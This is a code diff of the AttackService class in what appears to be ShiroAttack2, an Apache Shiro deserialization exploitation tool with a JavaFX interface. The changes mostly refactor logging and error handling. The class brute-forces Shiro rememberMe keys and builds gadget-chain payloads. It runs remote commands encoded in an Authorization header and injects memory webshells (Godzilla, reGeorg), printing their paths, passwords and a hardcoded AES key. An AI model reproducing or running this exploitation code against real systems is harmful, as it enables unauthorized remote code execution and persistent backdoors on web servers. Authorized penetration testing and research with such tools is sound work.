@@ -15,6 +15,7 @@ import com.summersec.attack.integration.generator.model.EchoGenerateRequest;
 import com.summersec.attack.integration.generator.model.EchoGenerateResult;
 import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
 import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
+import com.summersec.attack.utils.AppLogger;
 import com.summersec.attack.utils.HttpUtil;
 import com.summersec.attack.utils.Utils;
 import java.io.BufferedReader;
@@ -32,6 +33,7 @@ import java.util.regex.Pattern;
 
 import javafx.application.Platform;
 import javafx.collections.ObservableList;
+import javafx.scene.control.TextArea;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
 
@@ -66,17 +68,12 @@ public class AttackService {
 
     public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
         HashMap<String, String> combineHeaders = new HashMap();
-        combineHeaders.putAll(header);
-        Set<String> keySet = globalHeader.keySet();
-        for (String key : keySet) {
-            if (key.equals("Cookie")) {
-                String existing = combineHeaders.get("Cookie");
-                if (existing != null && !existing.isEmpty()) {
-                    combineHeaders.put("Cookie", globalHeader.get(key) + "; " + existing);
-                } else {
-                    combineHeaders.put("Cookie", globalHeader.get(key));
-                }
-            } else {
+        if (header != null) {
+            combineHeaders.putAll(header);
+        }
+        if (globalHeader != null) {
+            Set<String> keySet = globalHeader.keySet();
+            for (String key : keySet) {
                 combineHeaders.put(key, globalHeader.get(key));
             }
         }
@@ -97,7 +94,7 @@ public class AttackService {
                 result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
 
             } else {
-                String contentType = combineHeaders.containsKey("Content-Type") ? combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
+                String contentType = combineHeaders.containsKey("Content-Type") ? (String) combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
                 result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
             }
         } catch (Exception var5) {
@@ -186,19 +183,29 @@ public class AttackService {
 //                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
                 if (result.contains("Host")) {
-                    this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
-                    this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
-                    this.mainController.gadgetOpt.setValue(gadgetOpt);
-                    this.mainController.echoOpt.setValue(echoOpt);
+                    Platform.runLater(() -> {
+                        this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
+                        this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
+                        this.mainController.gadgetOpt.setValue(gadgetOpt);
+                        this.mainController.echoOpt.setValue(echoOpt);
+                    });
                     gadget = gadgetOpt;
                     attackRememberMe = rememberMe;
                     flag = true;
                 } else {
-                    this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt)));
                 }
+            } else {
+                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> payload 构造失败")));
             }
-        } catch (Exception var8) {
-            this.mainController.logTextArea.appendText(Utils.log(var8.getMessage()));
+        } catch (Throwable var8) {
+            String msg = var8.getMessage();
+            if (msg == null || msg.trim().isEmpty()) {
+                msg = var8.getClass().getName();
+            }
+            AppLogger.error("gadgetCrack 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var8);
+            final String finalMsg = msg;
+            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> " + finalMsg)));
         }
 
         return flag;
@@ -208,17 +215,39 @@ public class AttackService {
         String rememberMe = null;
 
         try {
-            Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
+            Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadgetOpt);
+            if (gadgetClazz == null) {
+                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("未找到利用链类: " + gadgetOpt)));
+                return null;
+            }
             ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
             Object template = Gadgets.createTemplatesImpl(echoOpt);
             Object chainObject = gadgetPayload.getObject(template);
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
-        } catch (Exception var9) {
+        } catch (Throwable var9) {
             var9.printStackTrace();
-            this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
+            String msg = var9.getMessage();
+            if (msg == null || msg.trim().isEmpty()) {
+                msg = var9.getClass().getName();
+            }
+            AppLogger.error("GadgetPayload 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var9);
+            final String finalMsg = msg;
+            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log(finalMsg)));
         }
 
         return rememberMe;
+    }
+
+    private Class<? extends ObjectPayload> resolvePayloadClass(String gadgetOpt) {
+        if (gadgetOpt == null || gadgetOpt.trim().isEmpty()) {
+            return null;
+        }
+        String className = gadgetOpt.substring(0, 1).toUpperCase() + gadgetOpt.substring(1);
+        try {
+            return (Class<? extends ObjectPayload>) Class.forName("com.summersec.attack.deser.payloads." + className);
+        } catch (Throwable ignored) {
+            return null;
+        }
     }
 
     public void simpleKeyCrack(String shiroKey) {
@@ -235,6 +264,27 @@ public class AttackService {
             this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
         }
 
+    }
+
+    public boolean verifyKey(String shiroKey) {
+        try {
+            if (shiroKey == null || shiroKey.trim().isEmpty()) {
+                return false;
+            }
+            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, this.shiroKeyWord, shiroKey);
+            HashMap<String, String> header = new HashMap();
+            header.put("Cookie", rememberMe);
+            String result = this.headerHttpRequest(header);
+            if (result == null || result.isEmpty()) {
+                return false;
+            }
+            if (this.flagCount <= 1) {
+                return !result.contains("=deleteMe");
+            }
+            return countDeleteMe(result) < this.flagCount;
+        } catch (Exception ignored) {
+            return false;
+        }
     }
 
     public void keysCrack() {
@@ -411,30 +461,51 @@ public class AttackService {
         });
         thread.start();
     }
-    public void execCmdTask(String command) {
+    public String execCmdTask(String command) {
         HashMap<String, String> header = new HashMap();
         header.put("Cookie", attackRememberMe);
         String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
-        header.put("Authorization", "Basic "+b64Command);
+        header.put("Authorization", "Basic " + b64Command);
+        AppLogger.info("执行命令请求: command=" + command);
         String responseText = this.bodyHttpRequest(header, "");
-        String result = responseText.split("\\$\\$\\$")[1];
-        if (!result.equals("")) {
-            byte[] b64bytes = Base64.decode(result);
-
-            try {
-                String defaultEncode = Utils.guessEncoding(b64bytes);
-                this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode));
-                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------"+ "\n");
-            } catch (UnsupportedEncodingException var8) {
-                this.mainController.execOutputArea.appendText(new String(b64bytes) + "\n");
-            }
-        } else {
-            this.mainController.execOutputArea.appendText(Utils.log("命令已执行,返回为空"));
+        if (responseText == null) {
+            AppLogger.warn("命令执行返回为空响应");
+            return null;
         }
-
+        if (!responseText.contains("$$$")) {
+            AppLogger.warn("命令执行返回非命令格式，按原始文本输出，长度=" + responseText.length());
+            return responseText;
+        }
+        String[] parts = responseText.split("\\$\\$\\$");
+        if (parts.length < 2) {
+            AppLogger.warn("命令执行返回分段不足，按原始文本输出，长度=" + responseText.length());
+            return responseText;
+        }
+        String result = parts[1];
+        if (result.equals("")) {
+            AppLogger.info("命令执行成功但返回为空: command=" + command);
+            return "";
+        }
+        byte[] b64bytes = Base64.decode(result);
+        try {
+            String defaultEncode = Utils.guessEncoding(b64bytes);
+            String decoded = new String(b64bytes, defaultEncode);
+            AppLogger.info("命令执行成功: command=" + command + ", responseEncoding=" + defaultEncode + ", responseLength=" + decoded.length());
+            return decoded;
+        } catch (UnsupportedEncodingException var8) {
+            String decoded = new String(b64bytes, StandardCharsets.UTF_8);
+            AppLogger.warn("命令执行结果编码探测失败，已回退 UTF-8: command=" + command);
+            return decoded;
+        }
     }
 
     public void injectMem(String memShellType, String shellPass, String shellPath) {
+        injectMem(memShellType, shellPass, shellPath, null);
+    }
+
+    public void injectMem(String memShellType, String shellPass, String shellPath, TextArea outputSink) {
+        TextArea logArea = outputSink != null ? outputSink : this.mainController.InjOutputArea;
+        boolean changeKeyMode = outputSink != null;
         String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
         if (injectRememberMe != null) {
             HashMap<String, String> header = new HashMap();
@@ -446,32 +517,63 @@ public class AttackService {
                 String b64Bytecode = MemBytes.getBytes(memShellType);
                 String postString = "user=" + b64Bytecode;
                 String result = this.bodyHttpRequest(header, postString);
-                if (result.contains("->|Success|<-")) {
+                if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
                     String httpAddress = Utils.UrlToDomain(this.url);
-                    this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
-                    this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
-                    if (memShellType.contains("哥斯拉")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
-                        this.mainController.InjOutputArea.appendText(Utils.log("密钥(Key)：3c6e0b8a9c15224a"));
-                        this.mainController.InjOutputArea.appendText(Utils.log("加密方式：AES"));
-                    } else if (!memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                    if (changeKeyMode || result.contains("->|change key ok|<-")) {
+                        logArea.appendText(Utils.log("[修改结果] 成功"));
+                        logArea.appendText(Utils.log("[新 Key] " + shellPass));
+                    } else {
+                        logArea.appendText(Utils.log("[注入结果] 成功"));
+                        logArea.appendText(Utils.log("[类型] " + memShellType));
                     }
-                    if (memShellType.contains("NeoreGeorg")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log("[!] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
+                    if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
+                        logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
+                    }
+                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("哥斯拉")) {
+                        logArea.appendText(Utils.log("[密码] " + shellPass));
+                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                        logArea.appendText(Utils.log("[加密方式] AES"));
+                    } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
+                        logArea.appendText(Utils.log("[密码] " + shellPass));
+                    }
+                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("NeoreGeorg")) {
+                        logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                     }
                 } else {
                     if (result.contains("->|") && result.contains("|<-")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log(result));
+                        logArea.appendText(Utils.log("[服务端响应] " + result));
                     }
 
-                    this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
+                    String httpAddress = Utils.UrlToDomain(this.url);
+                    boolean alreadyExists = result.contains("Filter already exists") || result.contains("Servlet already exists");
+                    if (alreadyExists) {
+                        logArea.appendText(Utils.log("[注入结果] 已存在，目标可能已经注入成功"));
+                        if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
+                            logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
+                        }
+                        if (!changeKeyMode && memShellType.contains("哥斯拉")) {
+                            logArea.appendText(Utils.log("[密码] " + shellPass));
+                            logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                            logArea.appendText(Utils.log("[加密方式] AES"));
+                        } else if (!changeKeyMode && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
+                            logArea.appendText(Utils.log("[密码] " + shellPass));
+                        }
+                        if (!changeKeyMode && memShellType.contains("NeoreGeorg")) {
+                            logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
+                        }
+                    } else {
+                        if (changeKeyMode) {
+                            logArea.appendText(Utils.log("[修改结果] 失败，请检查当前利用链、目标环境或重试其他变体"));
+                        } else {
+                            logArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或者更换新路径"));
+                        }
+                    }
                 }
             } catch (Exception var10) {
-                this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
+                logArea.appendText(Utils.log("[异常] " + var10.getMessage()));
             }
 
-            this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+            logArea.appendText(Utils.log("-------------------------------------------------"));
         }
 
     }
@@ -479,6 +581,9 @@ public class AttackService {
     public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
                                                          String legacyGadget, String legacyEcho, String shiroKey) {
         try {
+            if (source == null || source.trim().isEmpty()) {
+                source = "Legacy";
+            }
             if ("Legacy".equalsIgnoreCase(source)) {
                 String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                 if (rememberMe == null || rememberMe.isEmpty()) {
@@ -491,7 +596,10 @@ public class AttackService {
             request.setServerType(serverType);
             request.setModelType(modelType);
             request.setFormatType(formatType);
-            EchoGenerateResult result = generatorFacade.generateEcho(source, request);
+            request.setRequestHeaderName("User-Agent");
+            request.setRequestHeaderValue("Mozilla/5.0");
+            EchoGenerateResult result = generatorFacade.generateEcho(source, request)
+                    .withSelection(serverType, modelType, formatType);
             if (!result.isSuccess()) {
                 String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                 if (rememberMe != null && !rememberMe.isEmpty()) {
@@ -509,6 +617,9 @@ public class AttackService {
                                                                  String shellType, String formatType,
                                                                  String gadgetType, String legacyMemshellOption) {
         try {
+            if (source == null || source.trim().isEmpty()) {
+                source = "Legacy";
+            }
             MemshellGenerateRequest request = new MemshellGenerateRequest();
             request.setToolType(toolType);
             request.setServerType(serverType);
@@ -516,10 +627,28 @@ public class AttackService {
             request.setFormatType(formatType);
             request.setGadgetType(gadgetType);
             request.setOption(legacyMemshellOption);
-            MemshellGenerateResult result = generatorFacade.generateMemshell(source, request);
+            MemshellGenerateResult result = generatorFacade.generateMemshell(source, request)
+                    .withSelection(toolType, serverType, shellType, formatType, gadgetType);
             if (!result.isSuccess() && !"Legacy".equalsIgnoreCase(source)) {
+                String fallbackMessage = result.getMessage();
                 this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 生成失败，已自动回退 Legacy"));
-                return generatorFacade.generateMemshell("Legacy", request);
+                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 参数: server=" + serverType + ", tool=" + toolType + ", shell=" + shellType + ", format=" + formatType + ", gadget=" + gadgetType));
+                if (fallbackMessage != null && !fallbackMessage.trim().isEmpty()) {
+                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 原始错误: " + fallbackMessage));
+                }
+                MemshellGenerateResult legacyResult = generatorFacade.generateMemshell("Legacy", request)
+                        .withSelection(toolType, serverType, shellType, formatType, gadgetType);
+                if (legacyResult.isSuccess()) {
+                    return MemshellGenerateResult.okWithFallback(
+                            legacyResult.getSource(),
+                            legacyResult.getPayload(),
+                            legacyResult.getBasicInfo(),
+                            legacyResult.getDebugInfo(),
+                            source,
+                            fallbackMessage
+                    ).withSelection(toolType, serverType, shellType, formatType, gadgetType);
+                }
+                return legacyResult;
             }
             return result;
         } catch (Exception e) {
